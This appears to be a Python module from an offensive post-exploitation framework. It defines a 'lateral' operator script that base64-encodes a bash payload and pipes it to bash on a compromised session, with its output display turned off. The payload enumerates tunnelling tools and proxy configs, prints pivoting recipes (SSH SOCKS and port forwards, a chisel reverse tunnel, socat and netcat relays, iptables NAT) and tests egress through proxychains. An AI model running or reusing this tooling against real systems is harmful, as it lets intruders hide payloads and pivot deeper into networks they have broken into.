"""Automated proxy chain setup script."""

from ..base import OperatorScript, ScriptResult


class ProxyChainSetup(OperatorScript):
    """Automated proxy chain and pivoting setup."""
    
    name = "Proxy Chain Setup"
    description = "Setup proxy chains for pivoting"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] PROXY CHAIN SETUP"
echo "===================="
echo ""

echo "[+] Checking for proxy tools:"
command -v proxychains &>/dev/null && echo "[+] proxychains available" || echo "[-] proxychains not found"
command -v proxychains4 &>/dev/null && echo "[+] proxychains4 available" || echo "[-] proxychains4 not found"
command -v chisel &>/dev/null && echo "[+] chisel available" || echo "[-] chisel not found"
command -v ssh &>/dev/null && echo "[+] ssh available" || echo "[-] ssh not found"
command -v socat &>/dev/null && echo "[+] socat available" || echo "[-] socat not found"
echo ""

echo "[+] ProxyChains configuration:"
if [ -f /etc/proxychains.conf ]; then
    echo "[!] Found /etc/proxychains.conf"
    grep -v "^#" /etc/proxychains.conf | grep -v "^$"
elif [ -f /etc/proxychains4.conf ]; then
    echo "[!] Found /etc/proxychains4.conf"
    grep -v "^#" /etc/proxychains4.conf | grep -v "^$"
else
    echo "[-] No proxychains config found"
    echo "[*] Creating sample config:"
    cat <<EOF
[ProxyList]
socks5  127.0.0.1 1080
EOF
fi
echo ""

echo "[+] SSH SOCKS proxy setup:"
echo "  ssh -D 1080 -f -C -q -N user@pivot_host"
echo "  proxychains4 nmap TARGET"
echo ""

echo "[+] SSH port forwarding:"
echo "  Local: ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@pivot_host"
echo "  Remote: ssh -R PIVOT_PORT:localhost:LOCAL_PORT user@pivot_host"
echo "  Dynamic: ssh -D 1080 user@pivot_host"
echo ""

echo "[+] Chisel setup (HTTP tunnel):"
echo "  Server: chisel server -p 8080 --reverse"
echo "  Client: chisel client SERVER_IP:8080 R:socks"
echo ""

echo "[+] Socat port forwarding:"
echo "  socat TCP-LISTEN:8080,fork TCP:TARGET:80"
echo ""

echo "[+] Netcat relay:"
echo "  mkfifo /tmp/pipe; nc -l -p 8080 < /tmp/pipe | nc TARGET 80 > /tmp/pipe"
echo ""

echo "[+] iptables port forwarding:"
echo "  echo 1 > /proc/sys/net/ipv4/ip_forward"
echo "  iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination TARGET:80"
echo "  iptables -t nat -A POSTROUTING -j MASQUERADE"
echo ""

echo "[+] Checking current SOCKS proxies:"
ss -tlnp 2>/dev/null | grep ":1080\|:1081\|:9050" || netstat -tlnp 2>/dev/null | grep ":1080\|:1081\|:9050"
echo ""

echo "[+] Testing proxy connectivity:"
if command -v proxychains4 &>/dev/null && [ -f /etc/proxychains4.conf ]; then
    echo "[*] Testing with curl through proxychains..."
    timeout 5 proxychains4 curl -s https://ifconfig.me 2>/dev/null || echo "[-] Proxy test failed"
fi
echo ""

echo "[+] Existing SSH tunnels:"
ps aux | grep "ssh.*-[DLR]" | grep -v grep
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Setting up proxy chain...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Proxy chain setup executed",
                metadata={"script": "proxy_chain_setup"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
